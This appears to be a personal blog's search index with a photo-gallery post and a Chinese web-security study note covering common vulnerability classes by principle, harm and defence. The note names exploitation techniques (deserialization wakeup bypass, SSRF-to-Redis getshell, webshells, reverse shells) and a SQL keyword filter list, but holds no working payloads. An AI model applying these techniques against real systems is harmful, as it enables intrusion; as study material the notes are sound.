<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>然然美照捏</title>
    <url>/2022/09/01/%E5%98%89%E7%84%B6%E7%BE%8E%E7%85%A7%E6%8D%8F/</url>
    <content><![CDATA[<p><u><strong><code>编程玩的再好，我也不能编出完美爱情  </code></strong></u></p>
<p><u><strong><code>渗透玩的再强，我也不能提权进你的心</code></strong></u></p>
<p><img src="https://pic4.zhimg.com/80/v2-934e6fa2e65409827765dd10d55126fb_1440w.jpg?source=1940ef5c" alt="img"></p>
<span id="more"></span>



<p><img src="https://imgs.aixifan.com/content/2021_6_19/1.6240698992155275E9.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_bef3f9a1a99a46788042b04c38a7b243.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_760fe0000b7246ac811395092e22052d.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_c3ac0b2629d34c11a3f04bf00e742c8e.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_501d0f80926f45d386c1b09a7f60fa4e.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_1100ec000f55417f9ab605963c6b4496.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_60a32c7de2cc4eaf9d04c7bd251bf4ea.jpeg" alt="img"></p>
<p><img src="https://imgs.aixifan.com/newUpload/1307743_5dd902eab8dd4ab3979801ca40aabf0f.jpeg" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-932f2c2c69627ba96a8cfe1dea81e36f_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-a3fb342d44bd85b2bd0641c826c6bbd0_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-f15c9426e18febfac5bde90270faf6a3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-dbb499988d949727a787cce0e5421583_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-89672d74dc493ddbf3152ab56b461b88_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-4b4ff0c4014e2a19d8e4973a15d29465_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c807aec307bef9260d824a2c5e0c0beb_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-6fe879b650da6caa23c3078ece271f13_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic3.zhimg.com/80/v2-e5df9c9a913de7d44387d4c2b3d00472_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-9c3a89ea03680304931488372d908bcd_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pica.zhimg.com/80/v2-1afbaf55afe9662ec475664384f14403_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-53fd4aa98586e32c56c20d5f3b6a06d5_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic2.zhimg.com/80/v2-aee64d3f967e8c33ec5b49401bae2ade_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-c7dfefd2eea3dcef90ef7ee9ad6dd4d3_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-d0006553decea872cd9e63bf0d97e810_1440w.jpg?source=1940ef5c" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-9f8b7b5e3dd5d64b592823edb34689f8_1440w.jpg?source=1940ef5c" alt="img"></p>
]]></content>
      <categories>
        <category>要给然然单独开一个分类捏</category>
      </categories>
  </entry>
  <entry>
    <title>WEB学习</title>
    <url>/2022/05/28/Web-study/</url>
    <content><![CDATA[<p><u><code>学会一样东西，最重要特征就是可以把一个知识点的原理弄懂，造成一次成功注入，要注意分析源码当中导致这个漏洞的问题点，又应该如何改进与防御，</code></u></p>
<p><u><code>不要急于求成，慢即是快，少即是多</code></u></p>
<p><u><code>好记性不如烂笔头，一些知识点还是要多写几遍来记住，不是简单ctrl+c/+v就学到了，上机自己练习，打靶场，永远是最有效的方法，一定学会文章和实际操作密切结合，坚持做笔记</code></u></p>
<p><u><code>学东西就只当学一次，一次学到最好，不要囫囵吞枣</code></u></p>
<span id="more"></span>

<h1 id="Web安全学习"><a href="#Web安全学习" class="headerlink" title="Web安全学习"></a>Web安全学习</h1><h2 id="基础漏洞知识（一）【原理-危害-防御-利用】"><a href="#基础漏洞知识（一）【原理-危害-防御-利用】" class="headerlink" title="基础漏洞知识（一）【原理+危害+防御+利用】"></a>基础漏洞知识（一）【原理+危害+防御+利用】</h2><p>–转载原文链接：<a href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
<hr>
<h3 id="Sql漏洞篇"><a href="#Sql漏洞篇" class="headerlink" title="Sql漏洞篇"></a>Sql漏洞篇</h3><p><a href="#%E4%B8%80%E3%80%81sql">sql漏洞知识点记录</a></p>
<h4 id="1-sql漏洞原理"><a href="#1-sql漏洞原理" class="headerlink" title="1.sql漏洞原理"></a>1.sql漏洞原理</h4><p>指web应用程序<u><strong>对用户输入的数据合法性没有判断</strong></u>，导致攻击者可以<u><strong>构造不同的sql语句来对数据库数据库的操作</strong></u>。（web应用程序对用户输入的数据没有进行过滤，或者过滤不严，就把sql语句带进数据库中进行查询）。</p>
<p>Sql注入漏洞的产生需要满足两个条件：<br>①参数用户可控：<u><strong>前端传给后端的参数内容是用户可以控制的</strong></u>。<br>②<u><strong>参数代入数据库查询</strong></u>：传入的参数拼接到sql语句，且带入数据库查询。</p>
<h4 id="2-危害"><a href="#2-危害" class="headerlink" title="2.危害"></a>2.危害</h4><p>①数据库信息泄漏：数据库中存放的<u><strong>用户的隐私信息的泄露</strong></u>。<br>②网页篡改：通过操作数据库对特定网页进行篡改。<br>③网站被挂马，传播恶意软件：<u><strong>修改数据库一些字段的值，嵌入网马链接</strong></u>，进行挂马攻击。<br>④数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。<br>⑤服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。<br>⑥破坏硬盘数据，瘫痪全系统。</p>
<h4 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h4><p>①<u><strong>过滤危险字符</strong></u>：例如，采用正则表达式匹配union、sleep、load_file等关键字，如果匹配到，则退出程序。<br>②使用预编译语句：使用PDO预编译语句，需要注意，不要将变量直接拼接到PDO语句中，而是使用占位符进行数据库的增加、删除、修改、查询。<br>③特殊字符转义、使用严格的数据类型。</p>
<hr>
<h3 id="XSS漏洞篇"><a href="#XSS漏洞篇" class="headerlink" title="XSS漏洞篇"></a>XSS漏洞篇</h3><h4 id="1-XSS漏洞原理"><a href="#1-XSS漏洞原理" class="headerlink" title="1.XSS漏洞原理"></a>1.XSS漏洞原理</h4><p>恶意攻击者<u><strong>往Web页面里嵌入脚本代码</strong></u>（<u><strong>通常是JavaScript编写的恶意代码</strong></u>），当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。（恶意攻击者<u><strong>利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码</strong></u>，嵌入到web页面中去。）</p>
<h4 id="2-危害-1"><a href="#2-危害-1" class="headerlink" title="2.危害"></a>2.危害</h4><p>①盗取用户Cookie。<br>②修改网页内容。<br>③网站挂马。<br>④利用网站重定向。<br>⑤XSS蠕虫。</p>
<h4 id="3-防御-1"><a href="#3-防御-1" class="headerlink" title="3.防御"></a>3.防御</h4><p>①过滤输入的数据：包括” ’ ”、”&lt;”、“&lt;”、“&gt;”、“on”等非法字符。<br>②对输出到页面的数据进行相应的编码转换，包括html实体编码、javascript编码等。</p>
<hr>
<h3 id="CSRF漏洞篇"><a href="#CSRF漏洞篇" class="headerlink" title="CSRF漏洞篇"></a>CSRF漏洞篇</h3><h4 id="1-CSRF漏洞原理"><a href="#1-CSRF漏洞原理" class="headerlink" title="1.CSRF漏洞原理"></a>1.CSRF漏洞原理</h4><p>因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，<u><strong>没有校验表单token或者http请求头中的referer值</strong></u>（如果您<u><strong>在网页1，点击一个链接到网页2</strong></u>，当浏览器<u><strong>请求网页2时，网页1的URL就会包含在 Referer 头信息</strong></u>中），从而<u><strong>导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</strong></u>。</p>
<p><img src="https://img-blog.csdnimg.cn/20210601210954715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NfcHJvZ3JhbWo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>Csrf攻击过程两个重点：<br>①目标用户<u><strong>已经登录了网站</strong></u>，<u><strong>能够执行网站的功能</strong></u>。<br>②目标用户<u><strong>访问了攻击者构造的URL</strong></u>。</p>
<h4 id="2-危害-2"><a href="#2-危害-2" class="headerlink" title="2.危害"></a>2.危害</h4><p>①伪造HTTP请求进行未授权操作。<br>②篡改、盗取目标网站上的重要用户数据。<br>③未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等。<br>④如果通过使用社工等方式攻击网站管理员、会危害网站本身的安全性。<br>⑤作为其他攻击向量的辅助攻击手法，必须配合XSS<br>⑥传播CSRF蠕虫</p>
<h4 id="3-防御-2"><a href="#3-防御-2" class="headerlink" title="3.防御"></a>3.防御</h4><p>①验证请求的<u><strong><code>referer</code></strong></u>值，如果referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。<u><strong>如果referer是其他网站域名或空白，就有可能是csrf攻击，那么服务器拒绝该请求</strong></u>，但是此方法存在被绕过的可能【<u><strong>brupsuite可以抓包修改referer从而绕过前端过滤</strong></u>】。<br>②csrf攻击之所以能成功，是因为<u><strong>攻击者伪造用户的请求</strong></u>，所以抵御csrf的关键在于：在<u><strong>请求中放入攻击者不能伪造的请求</strong></u>，例如，可以在HTTP请求中加入一个随机产生的token，并在服务器端<u><strong>验证token</strong></u>【<u><strong>类似于验证码</strong></u>】，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求。</p>
<hr>
<h3 id="XXE漏洞篇"><a href="#XXE漏洞篇" class="headerlink" title="XXE漏洞篇"></a>XXE漏洞篇</h3><h4 id="1-XXE漏洞原理"><a href="#1-XXE漏洞原理" class="headerlink" title="1.XXE漏洞原理"></a>1.XXE漏洞原理</h4><p>XXE漏洞（XML 外部实体注入），XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
<p>XML文档结构包括<u><strong>XML声明、DTD文档类型定义（可选）、文档元素</strong></u>。</p>
<h4 id="2-危害-3"><a href="#2-危害-3" class="headerlink" title="2.危害"></a>2.危害</h4><p>①读取任意文件。<br>②执行系统命令。<br>③探测内网端口。<br>④攻击内网网站。</p>
<h4 id="3-防御-3"><a href="#3-防御-3" class="headerlink" title="3.防御"></a>3.防御</h4><p>①进制使用<u><strong>外部实体</strong></u>，例如：<br>PHP：libxml_disable_entity_loader(true)<br>②过滤用户提交的xml数据，防止出现非法内容。</p>
<hr>
<h3 id="SSRF漏洞篇"><a href="#SSRF漏洞篇" class="headerlink" title="SSRF漏洞篇"></a>SSRF漏洞篇</h3><h4 id="1-SSRF漏洞原理"><a href="#1-SSRF漏洞原理" class="headerlink" title="1.SSRF漏洞原理"></a>1.SSRF漏洞原理</h4><p>大都是由于<u><strong>服务器提供了从其他服务器应用获取数据的功能</strong></u>且<u><strong>没有对目标地址做过滤与限制</strong></u><strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</strong><u><strong>利用的是服务端的请求伪造</strong></u>。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p><img src="/2022/05/28/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/2022/05/28/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></p>
<h4 id="2-危害-4"><a href="#2-危害-4" class="headerlink" title="2.危害"></a>2.危害</h4><p>攻击者就可以<u><strong>利用该漏洞绕过防火墙等访问限制</strong></u>，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。</p>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p>
<p>2.攻击运行在内网或本地的应用程序</p>
<p>3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</p>
<p>4.攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p>
<p>5.下载内网资源(如：利用file协议读取本地文件等)</p>
<p>6.进行跳板</p>
<p>7.无视cdn</p>
<p>8.利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
<h4 id="3-防御-4"><a href="#3-防御-4" class="headerlink" title="3.防御"></a>3.防御</h4><p>① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。<br>② 限制不能访问内网的IP，以防止对内网进行攻击。<br>③ 屏蔽返回的详细信息。<br>④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>

<hr>
<h3 id="文件上传漏洞篇"><a href="#文件上传漏洞篇" class="headerlink" title="文件上传漏洞篇"></a>文件上传漏洞篇</h3><h4 id="1-文件上传漏洞原理"><a href="#1-文件上传漏洞原理" class="headerlink" title="1.文件上传漏洞原理"></a>1.文件上传漏洞原理</h4><p>就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（asp、php、jsp等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）</p>
<h4 id="2-危害-5"><a href="#2-危害-5" class="headerlink" title="2.危害"></a>2.危害</h4><p><u><strong>非法用户可以利用恶意脚本文件控制整个网站，甚至控制服务器</strong></u>。这个恶意脚本文件，又称为webshell，也可将webshell脚本称为一种网页后门，webshell脚本具有很强大的功能，<u><strong>比如查看服务器目录、服务器中的文件，执行绕过命令等。</strong></u>【<strong>用蚁剑或菜刀连接上传的 php文件，输入文件中的密码</strong>】</p>
<h4 id="3-防御-5"><a href="#3-防御-5" class="headerlink" title="3.防御"></a>3.防御</h4><p>①通过白名单方式判断文件后缀是否合法。<br>②对上传的文件进行重命名。</p>
<hr>
<h3 id="文件包含漏洞篇"><a href="#文件包含漏洞篇" class="headerlink" title="文件包含漏洞篇"></a>文件包含漏洞篇</h3><p><a href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含漏洞知识点记录</a></p>
<h4 id="1-文件包含漏洞原理"><a href="#1-文件包含漏洞原理" class="headerlink" title="1.文件包含漏洞原理"></a>1.文件包含漏洞原理</h4><p>开发人员将<u><strong>需要重复调用的函数写入一个文件，对该文件进行包含是产生的操作</strong></u>。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一：导航栏、底部footer栏等。<u><strong>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码</strong></u>。</p>
<h4 id="2-危害-6"><a href="#2-危害-6" class="headerlink" title="2.危害"></a>2.危害</h4><p>①获取敏感信息<br>②执行任意命令<br>③获取服务器权限</p>
<h4 id="3-防御-6"><a href="#3-防御-6" class="headerlink" title="3.防御"></a>3.防御</h4><p>①建议白名单。<br>②指定访问一定的路径，再将参数拼接到路径当中。</p>
<hr>
<h3 id="逻辑漏洞篇"><a href="#逻辑漏洞篇" class="headerlink" title="逻辑漏洞篇"></a>逻辑漏洞篇</h3><h4 id="1-逻辑漏洞原理"><a href="#1-逻辑漏洞原理" class="headerlink" title="1.逻辑漏洞原理"></a>1.逻辑漏洞原理</h4><p>指攻击者<u><strong>利用业务的设计缺陷，获取敏感信息或破坏业务的完整性</strong></u>。一般出现在<u><strong>密码修改、越权访问、密码找回、交易支付</strong></u>等功能处。</p>
<h4 id="2-危害-7"><a href="#2-危害-7" class="headerlink" title="2.危害"></a>2.危害</h4><p>任意密码修改、越权访问、密码任意找回、交易支付金额任意修改等</p>
<h4 id="3-防御-7"><a href="#3-防御-7" class="headerlink" title="3.防御"></a>3.防御</h4><h5 id="1-任意密码修改"><a href="#1-任意密码修改" class="headerlink" title="1.任意密码修改"></a>1.任意密码修改</h5><h5 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.越权访问</h5><p>越权访问漏洞产生<u><strong>主要原因是没有对用户的身份做判断和控制</strong></u>，防范这种漏洞时，可以通过session来控制。例如，在用户登录时，将username或uid写入到<code>session</code><u><strong>（会话控制，Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。）</strong></u>中取出信息，<u><strong>而不是从GET或POST取出username</strong></u>，name此时取到的username就是没有篡改的。</p>
<hr>
<h3 id="命令执行漏洞篇"><a href="#命令执行漏洞篇" class="headerlink" title="命令执行漏洞篇"></a>命令执行漏洞篇</h3><h4 id="1-命令执行漏洞原理"><a href="#1-命令执行漏洞原理" class="headerlink" title="1.命令执行漏洞原理"></a>1.命令执行漏洞原理</h4><p>应用未对用户输入做严格的检查过滤，导致用户<u><strong>输入的参数被当成命令来执行</strong></u>。攻击者可以任意执行系统命令，属于高危漏洞之一，也属于代码执行的范畴。</p>
<h4 id="2-危害-8"><a href="#2-危害-8" class="headerlink" title="2.危害"></a>2.危害</h4><p>①继承web服务程序的权限去执行系统命令或读写文件。<br>②反弹shell，获得目标服务器的权限。<br>③进一步内网渗透。</p>
<h4 id="3-防御-8"><a href="#3-防御-8" class="headerlink" title="3.防御"></a>3.防御</h4><p>①尽量不要使用命令执行函数。<br>②客户端<u><strong>提交的变量在进入执行命令函数前</strong></u>要做好<u><strong>过滤和检测</strong></u>。<br>③在<u><strong>使用动态函数之前</strong></u>，确保使用函数是<u><strong>指定的函数</strong></u>之一。<u><strong>【防止攻击者引入新函数（非网站使用的函数）执行攻击语句】</strong></u><br>④对<u><strong>php语言</strong></u>而言，<u><strong>不能完全控制的危险函数最好不要使用</strong></u>。</p>
<hr>
<h3 id="暴力破解篇"><a href="#暴力破解篇" class="headerlink" title="暴力破解篇"></a>暴力破解篇</h3><h4 id="1-暴力破解原理"><a href="#1-暴力破解原理" class="headerlink" title="1.暴力破解原理"></a>1.暴力破解原理</h4><p>由于服务器端没有做限制，导致攻击者可以通过暴力手段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个强大的字典，如4位数字的验证码，那么暴力破解的范围就是0000~9999，<u><strong>暴力破解的关键在于字典的大小</strong></u>。</p>
<h4 id="2-危害-9"><a href="#2-危害-9" class="headerlink" title="2.危害"></a>2.危害</h4><p>①用户密码被重置。<br>②敏感目录、参数被枚举。<br>③用户订单被枚举。</p>
<h4 id="3-防御-9"><a href="#3-防御-9" class="headerlink" title="3.防御"></a>3.防御</h4><p>① 如果<u><strong>用户登录次数超过设置的阈值</strong></u>，则<u><strong>锁定账号</strong></u>。<br>② 如果<u><strong>某个IP登陆次数超过设置的阈值，则锁定IP</strong></u>。但<u><em><strong>存在一个问题</strong></em></u>，如果<u><strong>多个用户使用的是同一个IP，则会造成其他用户也不能登录。</strong></u></p>
<hr>
<h3 id="反序列化漏洞篇（PHP）"><a href="#反序列化漏洞篇（PHP）" class="headerlink" title="反序列化漏洞篇（PHP）"></a>反序列化漏洞篇（PHP）</h3><h4 id="1-反序列化漏洞原理"><a href="#1-反序列化漏洞原理" class="headerlink" title="1.反序列化漏洞原理"></a>1.反序列化漏洞原理</h4><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p>
<p>漏洞的形成的<u><strong>根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果</strong></u>。反序列化漏洞并不是PHP特有，<u><strong>也存在于Java、Python等语言</strong></u>之中，但其原理基本相通。</p>
<p>PHP类都含有几个特定的元素: 类属性、类常量、类方法。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的类表示出来并传递。</p>
<p><u>序列化就是将一个<strong>类</strong>压缩成一个字符串的方法</u></p>
<h4 id="2-危害-10"><a href="#2-危害-10" class="headerlink" title="2.危害"></a>2.危害</h4><p><u><strong>未对用户输入的序列化字符串进行检测</strong></u>，导致<u><strong>攻击者可以控制反序列化过程</strong></u>，从而<u><strong>导致代码执行，SQL注入，目录遍历等不可控后果</strong></u>。在反序列化的过程中自动触发了某些魔术方法。</p>
<h4 id="3-防御-10"><a href="#3-防御-10" class="headerlink" title="3.防御"></a>3.防御</h4><h5 id="1-签名与认证"><a href="#1-签名与认证" class="headerlink" title="1)签名与认证"></a>1)签名与认证</h5><p>如果序列化的内容没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用接受黑客的异常输入。   </p>
<h5 id="2-限制序列化与反序列化的类"><a href="#2-限制序列化与反序列化的类" class="headerlink" title="2)限制序列化与反序列化的类"></a>2)限制序列化与反序列化的类</h5><p>增加一层序列化和反序列化接口类。这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要你在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了</p>
<h5 id="3-RASP检测"><a href="#3-RASP检测" class="headerlink" title="3)RASP检测"></a>3)RASP检测</h5><p>（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数（例如：序列化，反序列化)的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截.</p>
<h4 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用"></a>4.利用</h4><h5 id="1-wakeup-绕过"><a href="#1-wakeup-绕过" class="headerlink" title="1)__wakeup( )绕过"></a>1)__wakeup( )绕过</h5><p>(CVE-2016-7124)</p>
<p>反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。</p>
<h5 id="2-注入对象构造方法"><a href="#2-注入对象构造方法" class="headerlink" title="2)注入对象构造方法"></a>2)注入对象构造方法</h5><p>当目标对象被private、protected修饰时的构造方法。</p>
<h5 id="3-Session反序列化漏洞"><a href="#3-Session反序列化漏洞" class="headerlink" title="3)Session反序列化漏洞"></a>3)Session反序列化漏洞</h5><p>PHP中的Session经序列化后存储，读取时再进行反序列化。</p>
<h5 id="4-PHAR利用"><a href="#4-PHAR利用" class="headerlink" title="4)PHAR利用"></a>4)PHAR利用</h5><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
<hr>
<h3 id="RCE漏洞篇"><a href="#RCE漏洞篇" class="headerlink" title="RCE漏洞篇"></a>RCE漏洞篇</h3><h4 id="1-RCE漏洞原理"><a href="#1-RCE漏洞原理" class="headerlink" title="1.RCE漏洞原理"></a>1.RCE漏洞原理</h4><p>一般出现这种漏洞，是因为应用系统<u><strong>从设计上需要给用户提供指定的远程命令操作的接口</strong></u>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，<u><strong>没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</strong></u>。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给<u><strong>前端用户提供操作类的API接口（一般指应用程序的编程接口，主要目的是提供应用程序与开发人员以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节），一定需要对接口输入的内容进行严格的判断</strong></u>，比如实施严格的白名单策略会是一个比较好的方法。</p>
<h4 id="2-危害-11"><a href="#2-危害-11" class="headerlink" title="2.危害"></a>2.危害</h4><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入<u><strong>操作系统命令或者代码</strong></u>，从而控制后台系统。</p>
<h4 id="3-防御-11"><a href="#3-防御-11" class="headerlink" title="3.防御"></a>3.防御</h4><p>1)尽量不要使用命令执行函数。</p>
<p>2)不要让用户控制参数。</p>
<p>3)执行前做好检测和过滤。</p>
<hr>
<h3 id="SSTI漏洞篇"><a href="#SSTI漏洞篇" class="headerlink" title="SSTI漏洞篇"></a>SSTI漏洞篇</h3><h4 id="1-SSTI漏洞原理"><a href="#1-SSTI漏洞原理" class="headerlink" title="1.SSTI漏洞原理"></a>1.SSTI漏洞原理</h4><p><a href="https://xz.aliyun.com/t/3679#toc-0">推荐文章</a></p>
<p>SSTI是一种注入类的漏洞，其<u><strong>成因也可以类比SQL注入</strong></u>。<br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，</p>
<p>SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的<strong>jinja2、mako、tornado、Django</strong>，PHP的<strong>smarty twig</strong>，java的<strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。</p>
<p><u><strong>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</strong></u>。</p>
<p><strong>模板注入</strong>涉及的是服务端Web应用使用模板引擎<strong>渲染用户请求的过程</strong>，<br> 服务端把<strong>用户输入的内容渲染成模板</strong>就可能造成SSTI(Server-Side Template Injection)</p>
<p>模板渲染接受的参数需要用两个大括号<code>&#123;  &#123;&#125;  &#125;</code>括起来</p>
<h4 id="2-危害-12"><a href="#2-危害-12" class="headerlink" title="2.危害"></a>2.危害</h4><p>攻击者在服务器输入语句，服务端将其<u><strong>作为Web应用模板内容的一部分</strong></u>，在进行<u><strong>目标编译渲染</strong></u>的过程中，<u><strong>进行了语句的拼接，执行了所插入的恶意内容</strong></u>，从而<u><strong>导致信息泄露、代码执行、GetShell等</strong></u>问题</p>
<h4 id="3-防御-12"><a href="#3-防御-12" class="headerlink" title="3.防御"></a>3.防御</h4><p>1）和其他的注入防御一样，<u><strong>绝对不要让用户对传入模板的内容或者模板本身进行控制</strong></u></p>
<p>2）<u><strong>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染</strong></u>方式，<u><strong>使用正规的模板渲染方法</strong></u></p>
<h2 id="各漏洞知识记录笔记"><a href="#各漏洞知识记录笔记" class="headerlink" title="各漏洞知识记录笔记"></a>各漏洞知识记录笔记</h2><h3 id="一、sql"><a href="#一、sql" class="headerlink" title="一、sql"></a>一、sql</h3><h4 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h4><h5 id="①按照数据提交的方式来分类："><a href="#①按照数据提交的方式来分类：" class="headerlink" title="①按照数据提交的方式来分类："></a>①按照数据提交的方式来分类：</h5><p>  （1）GET 注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
<p>  （2）POST 注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中(输入框)。</p>
<p>  （3）Cookie 注入：HTTP请求的时候会带上客户端的Cookie, 注入点在Cookie当中的某个字段中。</p>
<p>  （4）HTTP 头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<h5 id="②按照执行效果来分类："><a href="#②按照执行效果来分类：" class="headerlink" title="②按照执行效果来分类："></a>②按照执行效果来分类：</h5><h6 id="（1）基于布尔的盲注："><a href="#（1）基于布尔的盲注：" class="headerlink" title="（1）基于布尔的盲注："></a>（1）基于布尔的盲注：</h6><p>即可以根据返回页面判断条件真假的注入。</p>
